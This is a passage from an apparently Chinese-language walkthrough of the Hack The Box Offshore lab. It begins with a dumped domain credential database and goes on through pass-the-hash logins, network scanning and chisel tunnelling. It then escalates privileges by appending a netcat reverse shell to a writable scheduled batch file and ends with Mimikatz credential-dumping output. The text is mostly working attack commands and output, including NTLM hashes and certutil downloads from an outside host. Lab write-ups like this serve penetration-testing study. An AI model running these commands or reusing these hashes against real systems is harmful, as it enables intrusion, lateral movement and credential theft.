** SAM ACCOUNT **

SAM Username         : Performance Monitor Users
Object Security ID   : S-1-5-32-558
Object Relative ID   : 558

Credentials:

Object RDN           : Performance Log Users

** SAM ACCOUNT **

SAM Username         : Performance Log Users
Object Security ID   : S-1-5-32-559
Object Relative ID   : 559

Credentials:

Object RDN           : Distributed COM Users

** SAM ACCOUNT **

SAM Username         : Distributed COM Users
Object Security ID   : S-1-5-32-562
Object Relative ID   : 562

Credentials:

Object RDN           : S-1-5-17


Object RDN           : IIS_IUSRS

** SAM ACCOUNT **

SAM Username         : IIS_IUSRS
Object Security ID   : S-1-5-32-568
Object Relative ID   : 568

Credentials:

Object RDN           : Cryptographic Operators

** SAM ACCOUNT **

SAM Username         : Cryptographic Operators
Object Security ID   : S-1-5-32-569
Object Relative ID   : 569

Credentials:

Object RDN           : Event Log Readers

** SAM ACCOUNT **

SAM Username         : Event Log Readers
Object Security ID   : S-1-5-32-573
Object Relative ID   : 573

Credentials:

Object RDN           : Certificate Service DCOM Access

** SAM ACCOUNT **

SAM Username         : Certificate Service DCOM Access
Object Security ID   : S-1-5-32-574
Object Relative ID   : 574

Credentials:

Object RDN           : RDS Remote Access Servers

** SAM ACCOUNT **

SAM Username         : RDS Remote Access Servers
Object Security ID   : S-1-5-32-575
Object Relative ID   : 575

Credentials:

Object RDN           : RDS Endpoint Servers

** SAM ACCOUNT **

SAM Username         : RDS Endpoint Servers
Object Security ID   : S-1-5-32-576
Object Relative ID   : 576

Credentials:

Object RDN           : RDS Management Servers

** SAM ACCOUNT **

SAM Username         : RDS Management Servers
Object Security ID   : S-1-5-32-577
Object Relative ID   : 577

Credentials:

Object RDN           : Hyper-V Administrators

** SAM ACCOUNT **

SAM Username         : Hyper-V Administrators
Object Security ID   : S-1-5-32-578
Object Relative ID   : 578

Credentials:

Object RDN           : Access Control Assistance Operators

** SAM ACCOUNT **

SAM Username         : Access Control Assistance Operators
Object Security ID   : S-1-5-32-579
Object Relative ID   : 579

Credentials:

Object RDN           : Remote Management Users

** SAM ACCOUNT **

SAM Username         : Remote Management Users
Object Security ID   : S-1-5-32-580
Object Relative ID   : 580

Credentials:

Object RDN           : System Managed Accounts Group

** SAM ACCOUNT **

SAM Username         : System Managed Accounts Group
Object Security ID   : S-1-5-32-581
Object Relative ID   : 581

Credentials:

Object RDN           : Storage Replica Administrators

** SAM ACCOUNT **

SAM Username         : Storage Replica Administrators
Object Security ID   : S-1-5-32-582
Object Relative ID   : 582

Credentials:

Object RDN           : Domain Computers

** SAM ACCOUNT **

SAM Username         : Domain Computers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-515
Object Relative ID   : 515

Credentials:

Object RDN           : Cert Publishers

** SAM ACCOUNT **

SAM Username         : Cert Publishers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-517
Object Relative ID   : 517

Credentials:

Object RDN           : Domain Users

** SAM ACCOUNT **

SAM Username         : Domain Users
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-513
Object Relative ID   : 513

Credentials:

Object RDN           : Domain Guests

** SAM ACCOUNT **

SAM Username         : Domain Guests
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-514
Object Relative ID   : 514

Credentials:

Object RDN           : RAS and IAS Servers

** SAM ACCOUNT **

SAM Username         : RAS and IAS Servers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-553
Object Relative ID   : 553

Credentials:

Object RDN           : Incoming Forest Trust Builders

** SAM ACCOUNT **

SAM Username         : Incoming Forest Trust Builders
Object Security ID   : S-1-5-32-557
Object Relative ID   : 557

Credentials:

Object RDN           : Terminal Server License Servers

** SAM ACCOUNT **

SAM Username         : Terminal Server License Servers
Object Security ID   : S-1-5-32-561
Object Relative ID   : 561

Credentials:

Object RDN           : Users

** SAM ACCOUNT **

SAM Username         : Users
Object Security ID   : S-1-5-32-545
Object Relative ID   : 545

Credentials:

Object RDN           : Guests

** SAM ACCOUNT **

SAM Username         : Guests
Object Security ID   : S-1-5-32-546
Object Relative ID   : 546

Credentials:

Object RDN           : Group Policy Creator Owners

** SAM ACCOUNT **

SAM Username         : Group Policy Creator Owners
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-520
Object Relative ID   : 520

Credentials:

Object RDN           : Pre-Windows 2000 Compatible Access

** SAM ACCOUNT **

SAM Username         : Pre-Windows 2000 Compatible Access
Object Security ID   : S-1-5-32-554
Object Relative ID   : 554

Credentials:

Object RDN           : S-1-5-9


Object RDN           : Windows Authorization Access Group

** SAM ACCOUNT **

SAM Username         : Windows Authorization Access Group
Object Security ID   : S-1-5-32-560
Object Relative ID   : 560

Credentials:

Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22


Object RDN           : Allowed RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Allowed RODC Password Replication Group
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-571
Object Relative ID   : 571

Credentials:

Object RDN           : Enterprise Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Enterprise Read-only Domain Controllers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-498
Object Relative ID   : 498

Credentials:

Object RDN           : Denied RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Denied RODC Password Replication Group
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-572
Object Relative ID   : 572

Credentials:

Object RDN           : Cloneable Domain Controllers

** SAM ACCOUNT **

SAM Username         : Cloneable Domain Controllers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-522
Object Relative ID   : 522

Credentials:

Object RDN           : Protected Users

** SAM ACCOUNT **

SAM Username         : Protected Users
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-525
Object Relative ID   : 525

Credentials:

Object RDN           : Enterprise Key Admins

** SAM ACCOUNT **

SAM Username         : Enterprise Key Admins
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-527
Object Relative ID   : 527

Credentials:

Object RDN           : DnsAdmins

** SAM ACCOUNT **

SAM Username         : DnsAdmins
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-1101
Object Relative ID   : 1101

Credentials:

Object RDN           : DnsUpdateProxy

** SAM ACCOUNT **

SAM Username         : DnsUpdateProxy
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-1102
Object Relative ID   : 1102

Credentials:

Object RDN           : MicrosoftDNS


Object RDN           : RootDNSServers


Object RDN           : @


Object RDN           : A.ROOT-SERVERS.NET


Object RDN           : B.ROOT-SERVERS.NET


Object RDN           : C.ROOT-SERVERS.NET


Object RDN           : D.ROOT-SERVERS.NET


Object RDN           : E.ROOT-SERVERS.NET


Object RDN           : F.ROOT-SERVERS.NET


Object RDN           : G.ROOT-SERVERS.NET


Object RDN           : H.ROOT-SERVERS.NET


Object RDN           : I.ROOT-SERVERS.NET


Object RDN           : J.ROOT-SERVERS.NET


Object RDN           : K.ROOT-SERVERS.NET


Object RDN           : L.ROOT-SERVERS.NET


Object RDN           : M.ROOT-SERVERS.NET


Object RDN           : Server


Object RDN           : DFSR-GlobalSettings


Object RDN           : Domain System Volume


Object RDN           : Content


Object RDN           : SYSVOL Share


Object RDN           : Topology


Object RDN           : DC04


Object RDN           : Domain System Volume


Object RDN           : DFSR-LocalSettings


Object RDN           : SYSVOL Subscription


Object RDN           : AdminSDHolder


Object RDN           : Schema Admins

** SAM ACCOUNT **

SAM Username         : Schema Admins
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-518
Object Relative ID   : 518

Credentials:

Object RDN           : Enterprise Admins

** SAM ACCOUNT **

SAM Username         : Enterprise Admins
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-519
Object Relative ID   : 519

Credentials:

Object RDN           : Print Operators

** SAM ACCOUNT **

SAM Username         : Print Operators
Object Security ID   : S-1-5-32-550
Object Relative ID   : 550

Credentials:

Object RDN           : Backup Operators

** SAM ACCOUNT **

SAM Username         : Backup Operators
Object Security ID   : S-1-5-32-551
Object Relative ID   : 551

Credentials:

Object RDN           : Replicator

** SAM ACCOUNT **

SAM Username         : Replicator
Object Security ID   : S-1-5-32-552
Object Relative ID   : 552

Credentials:

Object RDN           : Server Operators

** SAM ACCOUNT **

SAM Username         : Server Operators
Object Security ID   : S-1-5-32-549
Object Relative ID   : 549

Credentials:

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: e39e9de17383beb368b35218c36512fd

Object RDN           : Domain Controllers

** SAM ACCOUNT **

SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-516
Object Relative ID   : 516

Credentials:

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Read-only Domain Controllers
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-521
Object Relative ID   : 521

Credentials:

Object RDN           : Configuration


Object RDN           : DomainDnsZones


Object RDN           : ForestDnsZones


Object RDN           : BCKUPKEY_f87f3ba8-3af6-46b8-aaf1-1cbac9571131 Secret

  * Legacy key
a75c40d05a8b6f57407e21d8f4fa9d29ae141f00703a77a20dd9b1bcd26748f6
0363bff96867f1ef064ce583beb961d9ba4188b4af30c805f9265e1a9808cdaa
eff7f5b067f1dfcd17ec59769d9cca21d9792c22898f0586cd121986bf5add63
134a813c3203f02019bccae8046fe09a764035524d8624e4a4e0f4ce261e6d49
69859ee659b46eebdc172be4f8696ecc91971f8c80f00a82b9de59152c31af29
8f140542db7c89bf6d0942393656c549f15469484c43bf77a493f45165f391e6
e824e68f1a198370d9aeb7fb18e9babc67385300ac752cf78cb204b3a723035c
dfbfc9d422f4de2e047d518bfe8f288f1dbff442e2026e5c5e82cdaed64a4ef5


Object RDN           : BCKUPKEY_P Secret

Link to key with GUID: {f87f3ba8-3af6-46b8-aaf1-1cbac9571131} (not an object GUID)

Object RDN           : BCKUPKEY_05f116f9-717a-40e1-b76f-0d8080ea6acc Secret

  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   : 
        |Implementation: CRYPT_IMPL_SOFTWARE ; 
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES

Object RDN           : BCKUPKEY_PREFERRED Secret

Link to key with GUID: {05f116f9-717a-40e1-b76f-0d8080ea6acc} (not an object GUID)

Object RDN           : client_banking

** SAM ACCOUNT **

SAM Username         : client_banking
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-1105
Object Relative ID   : 1105

Credentials:
  Hash NTLM: c1403723973274b66e789363b396f5b5

Object RDN           : S-1-5-21-1216317506-3509444512-4230741538-1112


Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}


Object RDN           : S-1-5-21-1216317506-3509444512-4230741538-500


Object RDN           : Administrators

** SAM ACCOUNT **

SAM Username         : Administrators
Object Security ID   : S-1-5-32-544
Object Relative ID   : 544

Credentials:

Object RDN           : CLIENT$$$

** SAM ACCOUNT **

SAM Username         : CLIENT$$$
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4110
Object Relative ID   : 4110

Credentials:

Object RDN           : bankvault

** SAM ACCOUNT **

SAM Username         : bankvault
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4109
Object Relative ID   : 4109

Credentials:
  Hash NTLM: c718f548c75062ada93250db208d3178

Object RDN           : Machine


Object RDN           : User


Object RDN           : {ABBDB649-E74D-4DDB-A6B3-9C1055BE903C}


Object RDN           : Account Operators

** SAM ACCOUNT **

SAM Username         : Account Operators
Object Security ID   : S-1-5-32-548
Object Relative ID   : 548

Credentials:

Object RDN           : Domain Admins

** SAM ACCOUNT **

SAM Username         : Domain Admins
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-512
Object Relative ID   : 512

Credentials:

Object RDN           : ben

** SAM ACCOUNT **

SAM Username         : ben
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4605
Object Relative ID   : 4605

Credentials:
  Hash NTLM: 2b8311a8a7642b775f351df788e09630

Object RDN           : Service Technicians

** SAM ACCOUNT **

SAM Username         : Service Technicians
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4603
Object Relative ID   : 4603

Credentials:

Object RDN           : svc_clientsupport

** SAM ACCOUNT **

SAM Username         : svc_clientsupport
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4601
Object Relative ID   : 4601

Credentials:
  Hash NTLM: 9d9e699830214c433bcfecd5da790848

Object RDN           : client_adm

** SAM ACCOUNT **

SAM Username         : client_adm
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4604
Object Relative ID   : 4604

Credentials:
  Hash NTLM: 5022c8b3716dbbbf91189c46f8582479

Object RDN           : Machine


Object RDN           : User


Object RDN           : {37F7F153-93EE-4703-98A2-95C889D11918}


Object RDN           : Machine


Object RDN           : User


Object RDN           : Servers


Object RDN           : {70A57E17-F818-446E-A519-9BA466857BF4}


Object RDN           : svc_client_sec

** SAM ACCOUNT **

SAM Username         : svc_client_sec$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-9102
Object Relative ID   : 9102

Credentials:
  Hash NTLM: 2f01e4a6209eddac24027a90b3f2c1bb

Object RDN           : Key Admins

** SAM ACCOUNT **

SAM Username         : Key Admins
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-526
Object Relative ID   : 526

Credentials:

Object RDN           : {31B2F340-016D-11D2-945F-00C04FB984F9}


Object RDN           : DC04

** SAM ACCOUNT **

SAM Username         : DC04$
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-1000
Object Relative ID   : 1000

Credentials:
  Hash NTLM: 10868ab257bff3c2c07f46912d1343cb

Object RDN           : RID Manager$


Object RDN           : RID Set


Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a569f80ccd9fda0ea5e749d20aa80657

Object RDN           : MS02

** SAM ACCOUNT **

SAM Username         : MS02$
User Account Control : 01001000 ( WORKSTATION_TRUST_ACCOUNT TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: dc7a49c0c36399ae87f3de623ebab985

Object RDN           : ADMIN.OFFSHORE.COM


Object RDN           : ADMIN$

** SAM ACCOUNT **

SAM Username         : ADMIN$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-4105
Object Relative ID   : 4105

Credentials:
  Hash NTLM: 12609a2e0adab836514a4c5df024e914

Object RDN           : offshore_adm

** SAM ACCOUNT **

SAM Username         : offshore_adm
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-1104
Object Relative ID   : 1104

Credentials:
  Hash NTLM: 41b52c3a62bdf56dc69ccb0e7c7ebe6c


```

## 凭据整理
### 域基本信息
```plain
Domain        : CLIENT.OFFSHORE.COM
Domain SID    : S-1-5-21-524867371-2016665888-3240400722
Domain DC     : DC04.CLIENT.OFFSHORE.COM
```

---

### 最高权限账户
| 用户 | NTLM Hash | 说明 |
| --- | --- | --- |
| Administrator | `a569f80ccd9fda0ea5e749d20aa80657` | 域管理员 |
| krbtgt | `e39e9de17383beb368b35218c36512fd` | Golden Ticket |
| DC04$ | `10868ab257bff3c2c07f46912d1343cb` | 域控机器账户 |


---

### 普通域账户
| 用户 | NTLM |
| --- | --- |
| ben | `2b8311a8a7642b775f351df788e09630` |
| svc_clientsupport | `9d9e699830214c433bcfecd5da790848` |
| client_adm | `5022c8b3716dbbbf91189c46f8582479` |
| offshore_adm | `41b52c3a62bdf56dc69ccb0e7c7ebe6c` |
| client_banking | `c1403723973274b66e789363b396f5b5` |
| bankvault (disabled) | `c718f548c75062ada93250db208d3178` |


---

### 机器账户
| 机器 | NTLM |
| --- | --- |
| DC04$ | `10868ab257bff3c2c07f46912d1343cb` |
| MS02$ | `dc7a49c0c36399ae87f3de623ebab985` |
| svc_client_sec$ | `2f01e4a6209eddac24027a90b3f2c1bb` |


---

### 本地 Administrator（DC04）
```plain
Administrator
NTLM: 67e1046be5e785dd9773fb6bbeaad49c
```

---

### 域信任账户
```plain
ADMIN$
NTLM: 12609a2e0adab836514a4c5df024e914
```

## Administrator登录
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q evil-winrm -i 172.16.4.5 -u Administrator -H 'a569f80ccd9fda0ea5e749d20aa80657'
```

## 信息收集
### 主机探测
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | ForEach-Object {
    $ip = "172.16.4.$_"
    $ping = New-Object System.Net.NetworkInformation.Ping
    $reply = $ping.Send($ip, 100) 
    if ($reply.Status -eq "Success") {
        Write-Host "$ip is UP" -ForegroundColor Green
    }
}
172.16.4.5 is UP
172.16.4.31 is UP
172.16.4.120 is UP
```

发现172.16.4.120主机

### 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> $ports = @()
1..65535 | ForEach-Object {
    $p = ($_ / 15000) * 100
    Write-Progress -Activity "端口扫描" -Status "尝试连接 $_ 端口" -PercentComplete $p
    $tcp = New-Object System.Net.Sockets.TcpClient
    Try{
        $tcp.Connect("172.16.4.120",$_)
        $ports += $_
        Write-Warning "扫描到在线端口: $_"
        Write-Progress -Activity "端口扫描" -Status "$_ 端口连接成功" -PercentComplete $p
    }
    Catch{
        Write-Progress -Activity "端口扫描" -Status "$_ 端口连接失败" -PercentComplete $p
    }
    Finally{
        $tcp.Close()
    }
}
$ports
Warning: 扫描到在线端口: 22
Warning: 扫描到在线端口: 80
```

### 域内主机
```c
C:\Users\Public> powershell Get-ADComputer -Filter * -Properties IPv4Address
 

DistinguishedName : CN=DC04,OU=Domain Controllers,DC=CLIENT,DC=OFFSHORE,DC=COM
DNSHostName       : DC04.CLIENT.OFFSHORE.COM
Enabled           : True
IPv4Address       : 172.16.4.5
Name              : DC04
ObjectClass       : computer
ObjectGUID        : 343dad86-f81d-4fce-90a2-f81ca73e03cb
SamAccountName    : DC04$
SID               : S-1-5-21-524867371-2016665888-3240400722-1000
UserPrincipalName : 

DistinguishedName : CN=MS02,OU=Servers,DC=CLIENT,DC=OFFSHORE,DC=COM
DNSHostName       : MS02.CLIENT.OFFSHORE.COM
Enabled           : True
IPv4Address       : 172.16.4.31
Name              : MS02
ObjectClass       : computer
ObjectGUID        : f849ba92-1de2-477c-ab03-0c85c722d486
SamAccountName    : MS02$
SID               : S-1-5-21-524867371-2016665888-3240400722-1103
UserPrincipalName : 
```

### Bloodhound-python
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/blood]
└─# proxychains -q bloodhound-python -d CLIENT.OFFSHORE.COM -u Administrator@CLIENT.OFFSHORE.COM --hashes aad3b435b51404eeaad3b435b51404ee:a569f80ccd9fda0ea5e749d20aa80657 -ns 172.16.4.5 -dc dc04.client.offshore.com --dns-tcp --dns-timeout 30 --auth-method ntlm -c All
```

### 主机用户
```c
C:\Users\Public> net users
 
User accounts for \\

-------------------------------------------------------------------------------
Administrator            bankvault                ben                      
client_adm               client_banking           DefaultAccount           
Guest                    krbtgt                   offshore_adm             
svc_clientsupport        
The command completed with one or more errors.
```

## Getflag
```c
C:\Users\Public> net user client_banking
User name                    client_banking
Full Name                    
Comment                      **Old admin account for client banking app** OFFSHORE{h1dd3n_1n_pl@iN_$1ght}
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/29/2018 1:59:04 AM
Password expires             Never
Password changeable          4/30/2018 1:59:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.

```

得到flag

```c
OFFSHORE{h1dd3n_1n_pl@iN_$1ght}
```

## 隧道搭建
```c
proxychains -q evil-winrm -i 172.16.4.5 -u Administrator -H 'a569f80ccd9fda0ea5e749d20aa80657'
upload ../../tools/chisel/chisel.exe
certutil -urlcache -f http://10.10.16.2/chisel.exe chisel.exe
```

```c
while ($true) {
    Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1238:socks"
    Start-Sleep 10
}
```



# 172.16.4.31(Windows)（Setp:12）
## 端口扫描
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q nmap -Pn -sT 172.16.4.31 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 11:10 -0400
Nmap scan report for 172.16.4.31
Host is up (0.00s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1653.44 seconds
```

## RDP登录
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q xfreerdp /u:CLIENT\\offshore_adm /p:'Banker!123' /v:172.16.4.31 /cert:ignore /tls:seclevel:0 /size:1280x960
```

![](/image/prolabs/Offshore-81.png)

## Getflag
C:\Users\Administrator\Desktop\flag.txt

![](/image/prolabs/Offshore-82.png)

```c
OFFSHORE{th3_fin@l_h0p}
```

## 提权
我们发现每隔几分钟就会出现powershell随之便充值刷新

![](/image/prolabs/Offshore-83.png)

同时发现存在clean用户与脚本

![](/image/prolabs/Offshore-84.png)

### 查看计划任务
```c
schtasks /query /fo LIST /v
```

```c
C:\Users\offshore_adm>schtasks /query /fo LIST /v | findstr /i "clean"
TaskName:                             \Clean share
Task To Run:                          c:\users\public\downloads\clean.bat
Run As User:                          MS02\cleaner
TaskName:                             \Microsoft\Windows\ApplicationData\CleanupTemporaryState
Task To Run:                          %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
Comment:                              Cleans up each package's unused temporary files.
TaskName:                             \Microsoft\Windows\ApplicationData\DsSvcCleanup
Task To Run:                          %windir%\system32\dstokenclean.exe
TaskName:                             \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
Task To Run:                          %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
Folder: \Microsoft\Windows\DiskCleanup
TaskName:                             \Microsoft\Windows\DiskCleanup\SilentCleanup
Task To Run:                          %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
Comment:                              Maintenance task used by the system to launch a silent auto disk cleanup when running low on free disk space.
Comment:                              Launch language cleanup tool
TaskName:                             \Microsoft\Windows\Plug and Play\Plug and Play Cleanup
TaskName:                             \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
TaskName:                             \Microsoft\Windows\Servicing\StartComponentCleanup
TaskName:                             \Microsoft\Windows\Windows Defender\Windows Defender Cleanup
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpCmdRun.exe -IdleTask -TaskName WdCleanup
Comment:                              Periodic cleanup task.
```

```c
C:\Users\offshore_adm>schtasks /query /tn "Clean share" /v /fo list

Folder: \
HostName:                             MS02
TaskName:                             \Clean share
Next Run Time:                        3/9/2026 12:12:46 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        3/9/2026 12:07:46 PM
Last Result:                          1
Author:                               CLIENT\offshore_adm
Task To Run:                          c:\users\public\downloads\clean.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          MS02\cleaner
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           3:22:46 PM
Start Date:                           8/19/2018
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 5 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
```

### clean.bat
```c
forfiles -p "C:\Banking_Data" -s -m *.* /C "cmd /c del @path"
```

![](/image/prolabs/Offshore-85.png)

### 添加一个本地管理员
因为 c:\users\public\downloads\clean.bat 这个文件对普通用户是**可写**的，我们只需往里面追加恶意命令，等计划任务触发，就能以clean用户身份执行

```c
echo net user pwned Pwned!123 /add >> C:\Users\Public\Downloads\clean.bat
echo net localgroup administrators pwned /add >> C:\Users\Public\Downloads\clean.bat
```

![](/image/prolabs/Offshore-86.png)



### 验证
等待计划任务执行

```c
C:\Users\offshore_adm>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
cleaner
CLIENT\Domain Admins
CLIENT\svc_client_sec$
The command completed successfully.
```

没看见pwned用户增加，可能是因为**UAC (用户账户控制) 与计划任务的完整性级别 (Integrity Level)**。  
虽然 cleaner 是本地管理员组成员，但是这个计划任务在后台运行时，如果没有勾选“以最高权限运行 (Run with highest privileges)”，它默认是以 **中等完整性级别 (Medium Integrity)** 运行的。在这个级别下，它被 UAC 降权了，**没有权限直接创建用户或修改管理员组**！

### 反弹shell
```c
nc -lvnp 4444
```

```c
certutil -urlcache -f http://10.10.16.2/nc64.exe C:\Users\Public\nc.exe
```

```c
echo. >> C:\Users\Public\Downloads\clean.bat
//为了防止格式错误，我们先换行，再追加
echo C:\Users\Public\nc.exe 10.10.16.2 4444 -e cmd.exe >> C:\Users\Public\Downloads\clean.bat
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.110.3] 33169
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### 添加管理用户
```c
C:\Windows\system32>net user pwned Pwned!123 /add
net user pwned Pwned!123 /add

The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.

More help is available by typing NET HELPMSG 2245.
```

```c
C:\Windows\system32>net user pwned NewP@ssword!123 /add
net user pwned NewP@ssword!123 /add
The password entered is longer than 14 characters.  Computers
with Windows prior to Windows 2000 will not be able to use
this account. Do you want to continue thi
s operation? (Y/N) [Y]: 
No valid response was provided.
```

```c
C:\Windows\system32>powershell -Command "net user pwned P@ssw0rd123 /add; net localgroup administrators pwned /add"
powershell -Command "net user pwned P@ssw0rd123 /add; net localgroup administrators pwned /add"
The command completed successfully.

The command completed successfully.
```

原来之前没添加成功用户也可能是密码和cmd导致的

## 横向移动
### 抓取明文密码与机器 Hash (Mimikatz)
有了管理员权限，我们就可以为所欲为了。我们需要运行 Mimikatz 从内存中抓取关键凭据。

**上传并运行 Mimikatz**  
把你的 mimikatz.exe 复制或下载到 MS02（比如放到 C:\Users\Public\ 下）。  
在刚才高权限的 CMD 里运行它：

+ **Cmd  **

```plain
C:\Users\Public\mimikatz.exe
```

**抓取凭据**  
利用clean账户在 Mimikatz 的提示符 mimikatz # 下依次输入：

+ ******Text  **

```plain
privilege::debug
sekurlsa::logonpasswords
```

```c
C:\Users\Public\mimikatz.exe                                                                                            
                                                                                                                        
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                                            
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                             
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 31170201 (00000000:01db9e99)
Session           : Interactive from 0
User Name         : pwned
Domain            : MS02
Logon Server      : MS02
Logon Time        : 3/9/2026 12:48:03 PM
SID               : S-1-5-21-86684712-58618190-611843015-1006
        msv :
         [00000003] Primary
         * Username : pwned
         * Domain   : MS02
         * NTLM     : 89551acff8895768e489bb3054af94fd
         * SHA1     : 53b82718281a81ce064fca37118f0127112844d6
        tspkg :
        wdigest :
         * Username : pwned
         * Domain   : MS02
         * Password : (null)
        kerberos :
         * Username : pwned
         * Domain   : MS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 30554435 (00000000:01d23943)
Session           : Batch from 0
User Name         : cleaner
Domain            : MS02
Logon Server      : MS02
Logon Time        : 3/9/2026 12:32:46 PM
SID               : S-1-5-21-86684712-58618190-611843015-1001
        msv :
         [00000003] Primary
         * Username : cleaner
         * Domain   : MS02
         * NTLM     : 6f97c037d2655e16c9dd6790b143a845
